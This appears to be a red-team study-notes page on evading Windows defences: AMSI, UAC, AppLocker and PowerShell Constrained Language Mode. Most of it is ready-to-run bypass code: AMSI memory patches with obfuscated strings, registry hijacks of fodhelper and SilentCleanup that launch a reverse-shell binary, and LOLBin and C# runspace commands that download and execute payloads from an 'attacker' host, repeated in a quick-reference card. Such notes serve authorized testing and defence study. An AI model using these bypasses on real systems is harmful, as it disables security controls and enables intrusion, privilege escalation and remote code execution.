
🏠 [Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership) [☕ Discord](https://discord.com/invite/A446Bx4z)

**50% Discount For Members**
> Practitioner-grade cybersecurity notes, cert prep guides, and courses. All premium notes available at **[buymeacoffee.com/notescatalog/extras](https://buymeacoffee.com/notescatalog/extras)** or [shop.motasem-notes.net](shop.motasem-notes.net)

## 1. Core Concepts: What Are We Evading?

Before diving into techniques, you need to understand **what** you're evading and **why** it works.

|Control|What It Does|Why It Matters|
|---|---|---|
|**AMSI**|Scans scripts and in-memory code before execution.|Blocks PowerShell, VBScript, JScript, and .NET payloads.|
|**UAC**|Forces admin processes to run with a filtered token.|Prevents silent privilege escalation.|
|**AppLocker**|Whitelists approved executables, scripts, and DLLs.|Blocks unauthorized binaries from running.|
|**Constrained Language Mode**|Restricts PowerShell to a safe subset of features.|Blocks COM objects, .NET types, and advanced scripting.|

Each of these controls has a **weakness**. AMSI can be patched in memory, UAC can be bypassed via auto-elevating binaries, AppLocker can be bypassed via trusted LOLBins, and CLM can be escaped by spawning a new runspace.

Evasion is a cat-and-mouse game. A technique that works today may be signatured tomorrow. Always layer multiple techniques.

---

## 2. AMSI Bypass Techniques
**AMSI (Anti-Malware Scan Interface)** is a Microsoft API that lets security products inspect scripts and in-memory code before execution. It's integrated into PowerShell, WScript, Office VBA, and .NET.

### Technique 1: Setting `amsiInitFailed`
The classic bypass. If AMSI believes it failed to initialize, it won't scan anything for the lifetime of the process.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI sets a flag `amsiInitFailed` when initialization fails. If you set it to `$true` via reflection, AMSI thinks it's broken and skips all scans.

This exact one-liner is heavily signatured. Modern variants obfuscate the strings:
```powershell
$a = 'System.Management.Automation.AmsiUtils'
$b = 'amsiInitFailed'
[Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)
```
Or split strings to break signatures:
```powershell
$c = 'Amsi'+'Utils'
$d = 'amsi'+'Init'+'Failed'
```
### Technique 2: Patching `AmsiScanBuffer`
This technique patches the `AmsiScanBuffer` function in `amsi.dll` so it always returns clean.
```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@;
$patch = [Byte[]] (0x8B, 0x05, 0x40, 0x00, 0x00, 0x03);
$hModule = [Kernel32]::LoadLibrary("amsi.dll");
$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");
$lpflOldProtect = 0;
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;
$marshal = [System.Runtime.InteropServices.Marshal];
$marshal::Copy($patch, 0, $lpAddress, $patch.Length);
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;
```

**How it works:**
1. `LoadLibrary("amsi.dll")` , loads AMSI into the process.
    
2. `GetProcAddress` , finds the `AmsiScanBuffer` function.
    
3. `VirtualProtect` , marks the memory as writable.
    
4. `Marshal.Copy` , overwrites the function's first bytes with a patch that makes it return clean.
    
5. `VirtualProtect` , restores the original memory protection.
    
The byte patch `0x8B, 0x05, 0x40, 0x00, 0x00, 0x03` is the classic RastaMouse patch. It makes `AmsiScanBuffer` return `E_INVALIDARG` (an error), which AMSI interprets as "not malicious."

### Technique 3: Forcing an Error (Nulling Context)
This technique nulls out AMSI's internal context and session pointers, causing it to fail safely.
```powershell
$utils = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');
$context = $utils.GetField('amsi'+'Context', 'NonPublic, Static');
$session = $utils.GetField('amsi'+'Session', 'NonPublic, Static');
$marshal = [System.Runtime.InteropServices.Marshal];
$newContext = $marshal::AllocHGlobal(4);
$context.SetValue($null, [IntPtr]$newContext);
$session.SetValue($null, $null);
```

AMSI needs a valid context and session to scan. By nulling them out, any subsequent scan call fails silently and a failed scan is treated as "clean."

Notice the string concatenation (`'Amsi'+'Utils'`). This breaks static signatures that look for the literal string `AmsiUtils`. Always obfuscate AMSI bypasses.

### AMSI Bypass Comparison

|Technique|Stealth|Reliability|Notes|
|---|---|---|---|
|`amsiInitFailed`|Low|High|Classic; heavily signatured.|
|Patching `AmsiScanBuffer`|Medium|High|Requires memory write; may trigger EDR.|
|Nulling Context|Medium|Medium|Can cause instability.|
|Hook `LdrLoadDll`|High|High|Prevents AMSI from loading at all.|

---

## 3. UAC Bypass Techniques

**UAC (User Account Control)** forces admin processes to run with a filtered token. Bypasses exploit **auto-elevating binaries** ; trusted Windows executables that elevate without a prompt.

### Technique 1: DiskCleanup Scheduled Task Hijack
This abuses the `SilentCleanup` scheduled task, which runs as `SYSTEM`.
```powershell
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Windows\Tasks\RShell.exe <IP> 8088 & REM " -Force
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup\" -TaskName "SilentCleanup"
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
```

**How it works:**
1. The `SilentCleanup` task runs `%windir%\system32\cleanmgr.exe /autoclean`.
    
2. It reads `%windir%` from the **user's environment** (`HKCU:\Environment`), not the system's.
    
3. By setting `windir` to a malicious command, you hijack the execution.
    
4. The `& REM` at the end comments out the rest of the original command line.
    
5. The task runs as **SYSTEM** (auto-elevated), giving you a SYSTEM shell.
    

Always clean up after: `Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force`.

### Technique 2: FodHelper Execution Hijack
This abuses `fodhelper.exe`, an auto-elevating Windows binary.
```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\Tasks\RShell.exe <IP> 8080" -Force
C:\Windows\System32\fodhelper.exe
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

**How it works:**
1. `fodhelper.exe` is an auto-elevating binary (its manifest has `autoElevate="true"`).
    
2. When it runs, it queries the `ms-settings` ProgID in `HKCU\Software\Classes`.
    
3. Because `HKCU` takes precedence over `HKLM`, your malicious command runs instead.
    
4. `DelegateExecute` must be present (even if empty) for the command to execute.
    
5. The process inherits fodhelper's high-integrity token ; UAC is bypassed.
    

The key requirement is the `DelegateExecute` value. Without it, Windows ignores your command and uses the system-wide association.

### Technique 3: COM Hijacking (Advanced)
For `Always Notify` UAC settings, fodhelper won't work. Instead, abuse a COM object exposed by an auto-elevating process.

**General approach:**
1. Find a COM object that an auto-elevating binary instantiates.
    
2. Hijack its CLSID in `HKCU\Software\Classes\CLSID\{...}`.
    
3. Point it to your malicious DLL.
    
4. Trigger the auto-elevating binary.
    

**Common COM targets:**
- `IFileOperation` ; used to copy files to protected directories.
    
- `ShellWindows` ; used for shell execution.
    

Tools like **UACME** (`UACME-Akagi64.exe 33`) automate dozens of these techniques. Use them for testing, but understand the underlying mechanism.

### UAC Bypass Comparison

|Technique|Target|Reliability|Detection Risk|
|---|---|---|---|
|DiskCleanup|SilentCleanup task|High|Low (built-in task)|
|FodHelper|`fodhelper.exe`|High|Medium (well-known)|
|COM Hijacking|`IFileOperation`|Medium|Low (less common)|
|UACME|Various|High|Medium (tool signature)|

---

## 4. AppLocker Bypass Techniques
**AppLocker** is Microsoft's application whitelisting solution. It blocks unauthorized executables, scripts, DLLs, and installers. Bypasses exploit **trusted, signed Microsoft binaries** (LOLBins) that can execute arbitrary code.

### Enumerating AppLocker
Before bypassing, understand the rules.
```powershell
Get-AppLockerPolicy -Effective -Xml
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Tools\SysinternalsSuite\procexp.exe -User max
```

`Test-AppLockerPolicy` tells you if a specific binary would be allowed. Use it to find gaps in the policy.

### Technique 1: InstallUtil
`InstallUtil.exe` is a signed Microsoft binary that can execute .NET code via the `RunInstaller` attribute.

**C# payload:**
```c#
using System;
using System.Configuration.Install;
public class NotMalware_IU
{
    public static void Main(string[] args) { }
}
[System.ComponentModel.RunInstaller(true)]
public class A : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // CODE EXECUTION
    }
}
```

**Execution:**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U YourFile.exe
```

`InstallUtil.exe` is a trusted Microsoft binary. It loads the assembly and calls the `Uninstall` method (because of `/U`). Your malicious code executes inside a trusted process.

### Technique 2: RunDll32
`RunDll32.exe` is a signed Microsoft binary that can call exported functions from DLLs.

**C# payload:**
```c#
namespace RShell_D
{
    internal class Program
    {
        [DllExport("DllMain")]
        public static void DllMain()
        {
            // CODE EXECUTION
        }
    }
}
```

**Execution:**
```
C:\Windows\System32\RunDll32.exe YourFile.dll,DllMain
```

`RunDll32.exe` loads your DLL and calls the exported `DllMain` function. Because `RunDll32.exe` is trusted, AppLocker allows it.

### Other AppLocker Bypass LOLBins

|LOLBin|Usage|
|---|---|
|`msbuild.exe`|Executes inline C# tasks from a `.proj` file.|
|`cscript.exe` / `wscript.exe`|Executes VBScript/JScript.|
|`regsvr32.exe`|Registers COM DLLs (can fetch remote scripts with `/i:http://...`).|
|`mshta.exe`|Executes HTML Applications (HTA).|
|`certutil.exe`|Downloads files (`-urlcache -split -f`).|
|`bitsadmin.exe`|Downloads files via BITS.|

The pattern is always the same ; find a **signed Microsoft binary** that executes code, and feed it your payload. AppLocker trusts Microsoft-signed binaries by default.

---

## 5. Constrained Language Mode Bypass
**Constrained Language Mode (CLM)** restricts PowerShell to a safe subset of features. It blocks COM objects, most .NET types, and advanced scripting. Bypasses involve **spawning a new runspace** without CLM restrictions.

### The Runspace Bypass
```c#
Runspace runspace = RunspaceFactory.CreateRunspace();
runspace.Open();
PowerShell ps = PowerShell.Create();
// ... execute unrestricted PowerShell commands
```

**How it works:**
- CLM is applied to the **default runspace** of a PowerShell session.
    
- If you create a **new runspace** from .NET (C#), it doesn't inherit CLM.
    
- Inside this new runspace, you have **FullLanguage** mode.
    

**Full C# example:**
```c#
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
class Program
{
    static void Main()
    {
        Runspace runspace = RunspaceFactory.CreateRunspace();
        runspace.Open();
        PowerShell ps = PowerShell.Create();
        ps.Runspace = runspace;
        ps.AddScript("IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')");
        ps.Invoke();
    }
}
```

This is why **unmanaged PowerShell** (Cobalt Strike's `powerpick`, Mythic's `powerpick`) is so powerful ; it bypasses CLM entirely by hosting the CLR directly.

### Other CLM Bypass Methods

| Method              | Description                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| **PSByPassCLM**     | Uses `InstallUtil.exe` to load a .NET assembly that spawns a full-language runspace. |
| **RunspaceFactory** | Creates a new runspace from C# (as shown above).                                     |
| **Downgrade to v2** | `powershell.exe -Version 2` , v2 doesn't support CLM.                                |
| **Custom host**     | Build a custom PowerShell host that doesn't apply CLM.                               |

**PSByPassCLM example:**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U C:\temp\psby.exe
```

The v2 downgrade is the simplest but may not work on modern systems where PowerShell v2 is disabled (it's an optional feature).

## 6. Quick Reference Card

### AMSI Bypass
```powershell
# amsiInitFailed (classic)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Obfuscated variant
$a = 'System.Management.Automation.Amsi'+'Utils'
$b = 'amsi'+'Init'+'Failed'
[Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)
# Patch AmsiScanBuffer
# (See full code in Section 2)
# Null Context
$utils = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
$context = $utils.GetField('amsi'+'Context', 'NonPublic, Static')
$session = $utils.GetField('amsi'+'Session', 'NonPublic, Static')
$marshal = [System.Runtime.InteropServices.Marshal]
$newContext = $marshal::AllocHGlobal(4)
$context.SetValue($null, [IntPtr]$newContext)
$session.SetValue($null, $null)
```

### UAC Bypass
```powershell
# DiskCleanup hijack
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Windows\Tasks\RShell.exe <IP> 8088 & REM " -Force
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup\" -TaskName "SilentCleanup"
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
# FodHelper hijack
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\Tasks\RShell.exe <IP> 8080" -Force
C:\Windows\System32\fodhelper.exe
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
# UACME
UACME-Akagi64.exe 33   # fodhelper
UACME-Akagi64.exe 34   # disk cleanup
```

### AppLocker Bypass
```
# Enumerate
Get-AppLockerPolicy -Effective -Xml
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Tools\procexp.exe -User max
# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U YourFile.exe
# RunDll32
C:\Windows\System32\RunDll32.exe YourFile.dll,DllMain
# Other LOLBins
msbuild.exe payload.proj
cscript.exe //nologo payload.vbs
regsvr32.exe /s /u /i:http://attacker/payload.sct scrobj.dll
mshta.exe http://attacker/payload.hta
certutil.exe -urlcache -split -f http://attacker/payload.exe
```

### CLM Bypass
```c#
// C# runspace bypass
Runspace runspace = RunspaceFactory.CreateRunspace();
runspace.Open();
PowerShell ps = PowerShell.Create();
ps.Runspace = runspace;
ps.AddScript("IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')");
ps.Invoke();
```

From CMD:
```
:: PSByPassCLM
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U C:\temp\psby.exe
:: v2 downgrade
powershell.exe -Version 2
```

### Evasion Technique Summary

|Control|Primary Bypass|Key Requirement|
|---|---|---|
|**AMSI**|`amsiInitFailed` / Patch `AmsiScanBuffer`|Reflection or memory write.|
|**UAC**|FodHelper / DiskCleanup|Auto-elevating binary.|
|**AppLocker**|InstallUtil / RunDll32|Signed Microsoft binary.|
|**CLM**|RunspaceFactory / PSByPassCLM|.NET code execution.|

---

## Remember
- **AMSI is a scanning interface, not a security boundary.** It can be disabled by setting a flag, patching a function, or nulling its context.
    
- **UAC is a convenience feature, not a security boundary.** Auto-elevating binaries can be hijacked via registry keys.
    
- **AppLocker trusts Microsoft-signed binaries.** LOLBins like `InstallUtil.exe` and `RunDll32.exe` execute arbitrary code.
    
- **CLM is per-runspace.** Creating a new runspace from .NET bypasses it entirely.
    
- **Obfuscation is essential.** String concatenation, encoding, and variable renaming break static signatures.
    
- **Clean up after yourself.** Remove registry keys, restore environment variables, and delete dropped files.
    
- **Layer your techniques.** AMSI bypass + UAC bypass + AppLocker bypass = a full evasion chain.
    
- **Understand the mechanism, not just the command.** This lets you adapt when a technique is patched.
    
- **Test in isolated VMs.** Never test evasion techniques on production systems.
    
- **Stay legal.** These techniques are for authorized red team engagements and educational labs only.